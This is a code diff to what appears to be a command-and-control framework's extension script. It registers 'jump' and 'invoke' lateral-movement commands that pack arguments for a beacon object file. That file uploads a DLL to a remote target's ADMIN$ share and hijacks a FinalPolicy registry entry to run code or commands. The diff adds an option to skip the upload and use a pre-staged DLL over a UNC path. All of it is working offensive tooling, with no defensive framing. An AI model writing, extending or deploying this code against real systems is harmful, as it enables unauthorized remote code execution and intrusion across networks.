@@ -146,6 +146,7 @@ _cmd_jump_sipexec.addArgFlagString("-s", "share", "Upload share", "ADMIN$");
 _cmd_jump_sipexec.addArgFlagString("-g", "guid", "FinalPolicy GUID alias: default, driver, https", "default");
 _cmd_jump_sipexec.addArgFlagString("-f", "func", "$Function export name", "");
 _cmd_jump_sipexec.addArgBool("--no-cleanup", "Skip registry restore and file deletion");
+_cmd_jump_sipexec.addArgBool("--no-upload", "Skip upload, use --unc path for pre-staged DLL");
 _cmd_jump_sipexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let target = parsed_json["target"];
     let dll_content = parsed_json["dll"];
@@ -153,9 +154,10 @@ _cmd_jump_sipexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
     let guid = parsed_json["guid"];
     let func = parsed_json["func"] || "";
     let no_cleanup = parsed_json["--no-cleanup"] ? 1 : 0;
+    let no_upload = parsed_json["--no-upload"] ? 1 : 0;
 
-    let bof_params = ax.bof_pack("short,cstr,cstr,bytes,cstr,cstr,cstr,cstr,short",
-        [0, target, "", dll_content, "", share, guid, func, no_cleanup]);
+    let bof_params = ax.bof_pack("short,cstr,cstr,bytes,cstr,cstr,cstr,cstr,short,short",
+        [0, target, "", dll_content, "", share, guid, func, no_cleanup, no_upload]);
     let bof_path = bof_dir + "tmb_sipexec.o";
     let message = `Task: SIPExec jump to ${target} via FinalPolicy hijack`;
 
@@ -172,6 +174,7 @@ _cmd_invoke_sipexec.addArgFlagString("-s", "share", "Upload share", "ADMIN$");
 _cmd_invoke_sipexec.addArgFlagString("-g", "guid", "FinalPolicy GUID alias", "default");
 _cmd_invoke_sipexec.addArgFlagString("-f", "func", "$Function export name", "");
 _cmd_invoke_sipexec.addArgBool("--no-cleanup", "Skip cleanup");
+_cmd_invoke_sipexec.addArgBool("--no-upload", "Skip upload, use --unc path for pre-staged DLL");
 _cmd_invoke_sipexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let target = parsed_json["target"];
     let cmd = parsed_json["cmd"];
@@ -179,6 +182,7 @@ _cmd_invoke_sipexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lin
     let guid = parsed_json["guid"];
     let func = parsed_json["func"] || "";
     let no_cleanup = parsed_json["--no-cleanup"] ? 1 : 0;
+    let no_upload = parsed_json["--no-upload"] ? 1 : 0;
     let unc_path = parsed_json["unc_path"] || "";
 
     let dll_content = parsed_json["dll"];
@@ -186,10 +190,11 @@ _cmd_invoke_sipexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lin
     // If UNC override, skip upload
     if (unc_path.length > 0) {
         dll_content = "";
+        no_upload = 1;
     }
 
-    let bof_params = ax.bof_pack("short,cstr,cstr,bytes,cstr,cstr,cstr,cstr,short",
-        [1, target, cmd, dll_content, unc_path, share, guid, func, no_cleanup]);
+    let bof_params = ax.bof_pack("short,cstr,cstr,bytes,cstr,cstr,cstr,cstr,short,short",
+        [1, target, cmd, dll_content, unc_path, share, guid, func, no_cleanup, no_upload]);
     let bof_path = bof_dir + "tmb_sipexec.o";
     let message = `Task: SIPExec exec on ${target}: ${cmd}`;
 
